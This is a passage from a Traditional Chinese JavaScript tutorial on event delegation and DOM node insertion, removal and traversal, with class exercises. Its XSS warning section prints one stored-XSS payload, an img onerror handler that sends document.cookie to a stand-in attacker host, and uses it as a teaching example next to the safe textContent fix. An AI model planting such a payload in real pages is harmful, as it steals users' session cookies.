    style Li2 fill:#ff6b6b,stroke:#d63031,stroke-width:2px
    style Ul fill:#74b9ff,stroke:#0984e3,stroke-width:3px
    style UlHandler fill:#74b9ff,stroke:#0984e3,stroke-width:2px
    style FindTarget fill:#ff6b6b,stroke:#d63031,stroke-width:2px
    style Action fill:#00b894,stroke:#00a085,stroke-width:2px
{% endmermaid %}


```html
<ul id="todoList">
  <li>項目 1</li>
  <li>項目 2</li>
  <li>項目 3</li>
</ul>

<script>
  let todoList = document.getElementById("todoList");

  // 傳統方式：為每個 li 元素綁定事件（不推薦）
  // let items = document.querySelectorAll('#todoList li');
  // items.forEach(item => {
  //   item.addEventListener('click', function() {
  //     this.style.textDecoration = 'line-through';
  //   });
  // });

  // 事件委派方式：只在父元素 ul 上綁定一個事件處理器
  todoList.addEventListener("click", function (event) {
    // 檢查事件是否來自 li 元素
    if (event.target.tagName === "LI") {
      // 切換刪除線樣式
      event.target.style.textDecoration =
        event.target.style.textDecoration === "line-through" ? "none" : "line-through";
      
      console.log("點擊了：" + event.target.textContent);
      console.log("實際觸發元素：" + event.target.tagName);
      console.log("事件處理元素：" + event.currentTarget.tagName);
    }
  });
</script>
```

事件委派 vs 傳統方式的對比

| 特性           | 傳統方式               | 事件委派方式           |
| -------------- | ---------------------- | ---------------------- |
| 事件監聽器數量 | 每個子元素一個（5 個） | 只在父元素一個（1 個） |
| 記憶體使用     | 較多                   | 較少                   |
| 程式碼複雜度   | 簡單                   | 需要檢查事件目標       |
| 效能           | 較差                   | 較好                   |

{% note info %}
**事件委派的關鍵概念：**
- **event.target**：實際觸發事件的元素（如被點擊的 li）
- **event.currentTarget**：當前處理事件的元素（如綁定監聽器的 ul）
- **事件冒泡**：事件從子元素向上傳播到父元素的機制
- **效能優勢**：只需要一個事件監聽器就能處理多個子元素的事件
{% endnote %}

{% note warning %}
**注意事項：**
- 事件委派需要檢查 `event.target` 來確定實際觸發事件的元素
- 不是所有事件都會冒泡（如 focus、blur 不會冒泡）
- 使用 `event.stopPropagation()` 會阻止事件冒泡，影響事件委派
{% endnote %}

## DOM 節點操作
在掌握了事件與內容/屬性操作後，這一節完整介紹如何「新增、插入、移除與遍歷」DOM 節點，並給出實務建議與常見陷阱。在開始前，先建立一個重要觀念：這些 API 分成「ES5 傳統」與「ES6+ 現代」兩類。兩者可混用，但現代方法語法更直覺。

- ES5（傳統，普遍支援）：適用於舊專案或需要與老舊環境相容
| 方法              | 功能說明         | 適用類型 | 範例                                    |
| ----------------- | ---------------- | -------- | --------------------------------------- |
| `createElement()` | 建立新節點       | Node     | `document.createElement('li')`          |
| `appendChild()`   | 加入子節點（尾） | Node     | `parent.appendChild(node)`              |
| `replaceChild()`  | 替換子節點       | Node     | `parent.replaceChild(newNode, oldNode)` |
| `insertBefore()`  | 指定位置插入     | Node     | `parent.insertBefore(newNode, refNode)` |
| `removeChild()`   | 移除子節點       | Node     | `parent.removeChild(childNode)`         |

- ES6+（現代，建議優先）：語法更簡潔、彈性更高，支援多個節點或字串同時插入
| 方法                | 插入/操作位置                                                        | 多參數支援 | 適用類型                          | 範例                                       |
| ------------------- | -------------------------------------------------------------------- | ---------- | --------------------------------- | ------------------------------------------ |
| `append()`          | 內部尾端                                                             | ✅          | Node / string                     | `parent.append(node1, '文字', node2)`      |
| `prepend()`         | 內部開頭                                                             | ✅          | Node / string                     | `parent.prepend(node1, '文字', node2)`     |
| `before()`          | 同層前方                                                             | ✅          | Node / string                     | `ref.before(node1, '文字', node2)`         |
| `after()`           | 同層後方                                                             | ✅          | Node / string                     | `ref.after(node1, '文字', node2)`          |
| `replaceWith()`     | 同層取代                                                             | ✅          | Node / string                     | `ref.replaceWith(node1, '文字', node2)`    |
| `insertAdjacent*()` | 相鄰錨點，指定 beforebegin, afterbegin, beforeend, afterend 插入類型 | -          | 依 `*` 定義 HTML, Element, string | `el.insertAdjacentHTML('beforeend', html)` |
| `remove()`          | 自身移除                                                             | -          | Node                              | `node.remove()`                            |

{% note info %}
**怎麼選？**
DOM 的插入方法分為傳統與現代兩大類。早期僅有 `appendChild`、`insertBefore` 等屬於較舊的 API；自 ES2015（ES6）起，瀏覽器陸續支援 `append`、`prepend`、`before`、`after` 等現代方法，語法更簡潔、彈性更高。

- 新專案：優先 ES6+ 等價替代的現代方法；可讀性與生產力更好，而 `createElement()` 仍是現在標準 API。
- 舊專案/相容性：使用 `appendChild/insertBefore/removeChild/replaceChild` 等 ES5 方法。

無論哪種：插入的是「搬移」既有節點；若要保留原件，請 `cloneNode(true)`。
{% endnote %}

### 新增與插入
JavaScript 能夠動態建立新的 DOM 節點，並依需求插入到網頁中任何指定的位置，讓網頁內容可以即時更新與互動。

```js
const card = document.createElement('div');
card.className = 'card';

const title = document.createElement('h3');
title.textContent = '最新公告';

const desc = document.createElement('p');
desc.textContent = '本週五系統維護，請提前完成作業。';

// 1) 產生一個 a 連結節點並插入到 card 內
const link = document.createElement('a'); // 建立 a 標籤
link.href = 'https://www.google.com/';           // 設定連結目標網址
link.textContent = '前往 Google 網站';   // 設定連結文字
link.target = '_blank';                   // 新分頁開啟

card.append(title, desc, link); // 一次插入標題、描述與連結

// 將 card 插入到畫面上（例如 body）
document.body.append(card);
```

### 移動與複製
當你建立一個新的 DOM 節點時，這個節點在記憶體中只有一份。如果你嘗試將同一個節點插入到多個位置，瀏覽器會直接將它「搬移」到新的位置，而不是複製一份。因此，若要在多個地方出現相同結構，必須使用 `cloneNode()` 方法來複製節點。

```js
const ul = document.createElement('ul');

const listItem1 = document.createElement('li');
listItem1.textContent = '項目 1';

ul.append(listItem1); // append 可同時插入多個節點或字串，無回傳值

const listItem2 = document.createElement('li');
listItem2.textContent = '項目 2';
// ul.append(listItem2, listItem1); // 項目 1 DOM 同一個會被重新移動-> 2, 1

const listItem3 = listItem1.cloneNode(); // 複製 listItem1 的 DOM 結構，不包含 textContent
listItem3.textContent = '項目 3';
ul.append(listItem2, listItem3); // 項目 1, 2, 3

// 插入到畫面
document.body.append(ul);
document.body.append(ul.cloneNode(true));
```

{% note info %}
`cloneNode()` 方法的參數預設為 `false`，代表僅複製節點本身（不包含子元素與內容）；若設為 `true`，則會連同所有子節點與內容一併複製。
{% endnote %}

### 插入方式
這一節將系統性整理各種插入方式，並說明它們的適用場景與差異，幫助你寫出更簡潔、易維護的程式碼。常見插入位置分兩類：

#### 基礎操作
- 內部插入（成為子節點）：`append`（尾端）、`prepend`（開頭）
- 外部插入（與該元素同一層）：`before`（自身之前）、`after`（自身之後）、`replaceWith`（以新節點取代自身）

```js
const container = document.querySelector('#news');

// 內部插入
container.prepend(title);     // 最前面
container.append(desc);       // 最後面

// 外部插入（相對於 container）
container.before(document.createElement('hr'));   // container 前
container.after(document.createElement('hr'));    // container 後

// 取代自身
// container.replaceWith(card);
```

`insertBefore` 與 `insertAdjacent` 系列方法屬於進階且精細的 DOM 操作工具，能讓你將新節點或內容插入到特定節點的精確位置（如某個子節點之前、之後或指定錨點）。這些方法在需要高度控制插入位置時非常實用，尤其適合動態產生複雜結構或進行細部調整。雖然日常開發中較常用 `append`、`prepend` 等現代方法，

```js
// 1) 舊式但仍實用：insertBefore(newNode, referenceNode)
const list = document.querySelector('#list');
const item = document.createElement('li');
item.textContent = '插在第二個項目前';
list.insertBefore(item, list.children[1]);

// 2) insertAdjacentElement/HTML/Text：四個錨點
// 參數：position = 'beforebegin' | 'afterbegin' | 'beforeend' | 'afterend'
const box = document.querySelector('.box');
box.insertAdjacentHTML('beforebegin', '<p>在 .box 之前</p>');
box.insertAdjacentHTML('afterbegin', '<p>作為子節點的最前面</p>');
box.insertAdjacentHTML('beforeend', '<p>作為子節點的最後面</p>');
box.insertAdjacentHTML('afterend', '<p>在 .box 之後</p>');
```

#### 一次性插入大量
在產生大量節點時，反覆把節點直接插進畫面，瀏覽器會一次次地「改動真實 DOM」重新渲染，導致多次回流/重繪。DocumentFragment 是一個「記憶體容器」，不會觸發畫面更新。我們可以先把內容在記憶體組裝好，再一次插入畫面，減少重複的渲染成本。

- 記憶體組裝指的是在「離線容器」中把多個節點先做好（新增、排序、屬性與事件綁定），這些操作都還不會影響螢幕。
- 最後再把整個容器一次性插入真實 DOM，瀏覽器只需處理一次變動，效能更好。

##### 對照範例：逐筆 append vs Fragment 一次插入
```js
const list = document.querySelector('#list');

// A. 逐筆 append（每次都動到真實 DOM）
console.time('append-loop');
for (let i = 1; i <= 1000; i++) {
  const li = document.createElement('li');
  li.textContent = `項目 ${i}`;
  list.appendChild(li); // 每次都觸碰到真實 DOM
}
console.timeEnd('append-loop');

// B. 以 Fragment 記憶體組裝，再一次插入
console.time('fragment-once');
const frag = document.createDocumentFragment();
for (let i = 1; i <= 1000; i++) {
  const li = document.createElement('li');
  li.textContent = `項目 ${i}`;
  frag.appendChild(li); // 只在記憶體中操作
}
list.appendChild(frag); // 只動真實 DOM 一次
console.timeEnd('fragment-once');
```

{% note info %}
**差異重點：**
- 逐筆 append：對真實 DOM 進行 N 次插入，可能造成 N 次排版/重繪。
- Fragment：先在記憶體組裝，最後 1 次插入，通常更快、更穩定。
- Fragment 插入後「自身會清空」，因為子節點被搬移到目標容器（這是預期行為）。
{% endnote %}

#### 大量字串時的替代方案
- 若你握有已生成好的 HTML 字串，`insertAdjacentHTML('beforeend', html)` 可能更快；直接把 HTML Code 插入指定處，但要注意 XSS 安全。
- 批次更新期間，可先把容器設為 `display: none`，更新完再顯示，亦能降低中間的重繪干擾（但會造成佈局跳動）。

```html
<div id="cards"></div>

<script>
const cards = document.getElementById('cards');

// A. insertAdjacentHTML：一次插入大量已組好的 HTML 字串
const html = Array.from({ length: 5 }, (_, i) => `
  <article class="card">
    <h3>卡片標題 ${i + 1}</h3>
    <p>這是卡片內容段落，示範以 HTML 片段插入。</p>
  </article>
`).join('');

cards.insertAdjacentHTML('beforeend', html);

// B. display: none 批次更新（避免中途重繪干擾）
cards.style.display = 'none';
cards.insertAdjacentHTML('beforeend', '<article class="card">額外卡片 A</article>');
cards.insertAdjacentHTML('beforeend', '<article class="card">額外卡片 B</article>');
cards.style.display = '';
</script>
```

{% note warning %}
**XSS 是什麼？**
XSS（跨站腳本攻擊，Cross-Site Scripting）：攻擊者將惡意腳本（多為 `<script>` 或事件屬性如 `onerror`）注入到頁面，導致在受害者瀏覽器中執行，可能竊取 Cookie、Token、操作使用者帳號等。

- 風險來源：直接把「未過濾的使用者輸入」或「不可信來源的 HTML 字串」插入到頁面，如 `innerHTML`、`insertAdjacentHTML`。
- 基本防護：
  - 對外部輸入做輸入驗證與輸出轉義（escape HTML 特殊字元）。
  - 優先使用「文字 API」如 `textContent` 替代插入 HTML 字串。
  - 只在必要時使用 `insertAdjacentHTML`，且來源必須可信。
  - 可搭配 CSP（Content Security Policy）限制內聯腳本執行。

- 情境：儲存型 XSS（Stored XSS）
  1) 攻擊者在留言/表單輸入惡意內容（例如 `<img src=x onerror="steal()">`）
  2) 後端未清洗即存入資料庫
  3) 頁面渲染從資料庫撈出，為了排版用 `innerHTML/insertAdjacentHTML` 插入
  4) 惡意事件屬性被瀏覽器解析並執行，攻擊者即可在該頁以使用者身分做任何事

```js
// 危險：直接將後端回傳的 HTML 串進列表
const list = document.querySelector('#comments');
const commentHtml = '<p>Nice!</p><img src=x onerror="fetch(\'https://attacker\/?c=\'+document.cookie)">';
list.insertAdjacentHTML('beforeend', '<li>'+ commentHtml +'</li>');

// 建議：改以文字與節點操作，或先用白名單清洗後再插入
const item = document.createElement('li');
const p = document.createElement('p');
p.textContent = 'Nice!';
item.append(p);
list.append(item);
```
{% endnote %}

### 移除節點與清空
在操作 DOM 時，除了插入新節點之外，「移除」與「清空」也是常見且重要的需求。例如：刪除不再需要的卡片、移除某個區塊，或是將容器內容全部清空以便重新渲染。以下將介紹現代與傳統的節點移除方法，以及安全清空內容的技巧。

```js
// 移除自身（現代）
card.remove();

// 傳統作法：由父節點移除
if (card.parentNode) {
  card.parentNode.removeChild(card);
}

// 清空容器（保留節點本身）
const panel = document.querySelector('.panel');
panel.innerHTML = ''; // 快速，但會銷毀事件與狀態

// 更保守清空方式
while (panel.firstChild) {
  panel.removeChild(panel.firstChild);
}
```

### 節點遍歷與定位
這一節將介紹常用的節點遍歷方法，幫助你靈活取得父層、子層、兄弟節點，並說明如何以不同起點進行元素搜尋，讓你能更精確地操作網頁結構。

#### 基礎操作
```js
const node = document.querySelector('.item.active');

// 往上（父層）
const parent = node.parentElement;        // 或 parentNode（可能是 Document）
const form = node.closest('form');        // 往上尋找符合選擇器的最近祖先

// 往下（子層）
const children = node.children;           // HTMLCollection（僅元素）
const first = node.firstElementChild;     // 第一個子元素
const last = node.lastElementChild;       // 最後一個子元素

// 同層前後
const prev = node.previousElementSibling; // 前一個兄弟元素
const next = node.nextElementSibling;     // 後一個兄弟元素
```

#### 指定起點向下搜尋
`document.querySelector()` 會從整份文件找，而「任何元素節點」也都可以當成查找起點。例如：
```js
const section = document.querySelector('#profile');
// 只在 section 範圍內找子孫層的 .avatar img
const avatarImg = section.querySelector('.avatar img');
// 找到多個時用 querySelectorAll（NodeList，可 forEach）
const items = section.querySelectorAll('li.item');
```

{% note info %}
**:scope 的用法**
- 在複雜選擇器中，`:scope` 代表當前查找的起點元素。
- 範例：`section.querySelector(':scope > ul > li:first-child')` 僅會在 `section` 直系子層的 `ul` 裡取第一個 `li`。
{% endnote %}

#### 範例：將項目上移/下移（與前/後兄弟交換）
```js
function moveUp(item) {
  const prev = item.previousElementSibling;
  if (prev) prev.before(item); // 把自己插到前一個前面
}

function moveDown(item) {
  const next = item.nextElementSibling;
  if (next) next.after(item);  // 把自己插到下一個後面
}
```

{% note primary %}
**小抄：常用 API 對照**
- 內部插入：`append`（尾）、`prepend`（首）
- 外部插入：`before`（前）、`after`（後）、`replaceWith`（取代自身）
- 舊式插入：`insertBefore(new, ref)`（在 ref 前）
- 精準錨點：`insertAdjacent*('beforebegin'|'afterbegin'|'beforeend'|'afterend')`
- 移除：`remove()`、`parentNode.removeChild(node)`
- 建立/複製：`createElement`、`createTextNode`、`cloneNode(true|false)`
- 遍歷：`parentElement`、`children`、`first/lastElementChild`、`previous/nextElementSibling`、`closest`
{% endnote %}

{% note danger %}
**常見陷阱**
- 使用 `innerHTML += '...'` 會重新解析整段 HTML，可能丟失既有節點的事件/狀態。
- 直接覆蓋 `outerHTML` 會替換整個元素（包含自身），原本的 JS 參考會失效。
- 事件綁定在被移除或被取代的節點上會一併消失，請視需要改用事件委派。
{% endnote %}

## 課堂練習
{% tabs classtry,1 %}
<!-- tab 說明 -->
1. 參考 HTML 與 CSS 為 div 元素設計四種形狀（正方形、圓形、三角形、星形），並以 class 切換方式實現。
2. 請撰寫 JavaScript 程式碼，讓使用者可透過按鈕切換形狀，並可改變顏色代碼即時變更 div 的背景色。

```html
<style>
  .form-container {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 16px;
    margin: 0 auto;

    button {
      padding: 8px 16px;
      border: 1px solid #ccc;
      background: #f5f5f5;
    }

    input {
      width: 40px;
      height: 40px;
      border: none;
      background: none;
      cursor: pointer;
    }
  }

  #preview-block {
    background-color: red;
    margin: 0 auto;
    width: 100px;
    height: 100px;

    &.square {
      clip-path: polygon(0 0, 100% 0, 100% 100%, 0% 100%);
    }

    &.circle {
      clip-path: circle(50% at 50% 50%);
    }

    &.triangle {
      clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
    }

    &.star {
      clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
    }
  }
</style>

<form class="form-container">
  <button type="button" value="square">正方形</button>
  <button type="button" value="circle">圓形</button>
  <button type="button" value="triangle">三角形</button>
  <button type="button" value="star">星星</button>
  <input type="color" value="#ff0000" />
</form>
<hr />
<div id="preview-block" class="square"></div>

<script>
  // todo...
</script>
```
<!-- endtab -->
<!-- tab 解答-->
```js
const zone = document.getElementById("preview-block");
let clr = zone.style.backgroundColor; //red

const buttons = document.querySelectorAll("button");
buttons.forEach(button => {
  button.addEventListener("click", () => {
    trans(button.value);
  });
});

const colorInput = document.querySelector("input");
colorInput.addEventListener("change", (e) => {
  color(e.target.value);
});

function trans(re) {
  switch (re) {
    case "square":
      zone.classList.add("square");
      zone.classList.remove("circle");
      zone.classList.remove("triangle");
      zone.classList.remove("star");
      break;
    case "circle":
      zone.classList.add("circle");
      zone.classList.remove("square");
      zone.classList.remove("triangle");
      zone.classList.remove("star");
      break;
    case "triangle":
      zone.classList.add("triangle");
      zone.classList.remove("square");
      zone.classList.remove("circle");
      zone.classList.remove("star");
      break;
    case "star":
      zone.classList.add("star");
      zone.classList.remove("square");
      zone.classList.remove("circle");
      zone.classList.remove("triangle");
      break;
  }
}

function color(re) {
  clr = re;
}

// 如可以，請重購代碼至 10 行內
```
<!-- endtab -->
{% endtabs %}

## 自我挑戰
顏色選擇器是一個實用的工具，結合了多種 DOM 操作技巧。這個作業將考驗您對事件處理、樣式操作和用戶介面設計的綜合運用能力。

建立一個顏色選擇器，具備以下功能：
1. 即時隨機預覽顏色效果
2. 顯示當前顏色的十六進位值
3. 可使用 RGB 滑桿或輸入值控制顏色
4. 可使用操作事件按鈕改變顏色

挑戰示範一：
- [view](https://summer10920.github.io/studies_TeachDemo_JSJQ/vanillaJS/colorEditor)
- [code](https://github.com/summer10920/studies_TeachDemo_JSJQ/blob/master/vanillaJS/colorEditor/index.html)

商務示範二：
{% codepen summer10920 abRMXwm dark result 600 %}

# 總結

經過這篇教學的學習，您已經掌握了 JavaScript BOM 與 DOM 的核心概念和實作技巧。這些知識是現代網頁開發的基礎，將為您後續學習更進階的 JavaScript 概念奠定堅實的基礎。

在本篇教學中，我們學習了：

1. **BOM 基礎**：瀏覽器物件模型的概念和常用方法
2. **DOM 基礎**：文件物件模型和元素選擇方法
3. **內容操作**：如何讀取和修改元素內容
4. **事件處理**：響應用戶互動的方法
5. **實作練習**：透過實際範例鞏固學習

這些知識是 JavaScript 網頁開發的基礎，掌握它們將讓您能夠創造豐富的網頁互動體驗。在下一階段，我們將學習更進階的 JavaScript 概念，如非同步程式設計、AJAX 等。

{% note default %}
**延伸閱讀：**
- [MDN Web Docs - DOM](https://developer.mozilla.org/zh-TW/docs/Web/API/Document_Object_Model)
- [MDN Web Docs - BOM](https://developer.mozilla.org/en-US/docs/Web/API/Window)
- [JavaScript 事件參考](https://developer.mozilla.org/zh-TW/docs/Web/Events)
{% endnote %}
